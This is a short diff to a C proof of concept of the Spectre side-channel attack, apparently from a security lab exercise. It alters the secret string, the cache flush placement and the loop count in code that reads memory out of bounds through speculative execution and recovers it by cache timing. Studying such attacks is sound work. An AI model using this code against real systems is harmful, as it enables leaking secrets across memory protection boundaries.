@@ -7,7 +7,7 @@
 unsigned int buffer_size = 10;
 uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
 uint8_t temp = 0;
-char *secret = "SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS";   
+char *secret = "Some Secret Value";   
 uint8_t array[256*4096];
 
 #define CACHE_HIT_THRESHOLD (180)
@@ -48,7 +48,6 @@ void reloadSideChannel()
     }
   } 
 }
-
 void spectreAttack(size_t larger_x)
 {
   int i;
@@ -70,9 +69,9 @@ void spectreAttack(size_t larger_x)
 }
 
 int main() {
+  flushSideChannel();
   size_t larger_x = (size_t)(secret - (char*)buffer);  
-  for (int k = 0; k < 60; ++ k) {
-    flushSideChannel();
+  for (int k = 0; k < 17; ++ k) {
     spectreAttack(larger_x + k);
     reloadSideChannel();
   }
